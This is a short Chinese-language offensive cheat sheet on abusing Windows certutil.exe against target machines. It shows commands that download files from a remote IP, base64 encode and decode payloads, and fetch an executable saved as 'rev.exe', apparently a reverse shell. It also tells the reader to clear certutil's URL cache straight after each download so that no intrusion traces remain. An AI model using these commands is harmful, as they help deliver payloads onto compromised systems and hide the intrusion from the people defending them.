# certutil.exe



**靶机：**windows 2003 windows 7

```bash
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt
```

certutil.exe 下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载后，**需要马上执行如下**：

```bash
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete
```



```bash
certutil -encode file file
certutil -decode
```



```
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe
if not work 
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe && mv *.bin rev.exe


```
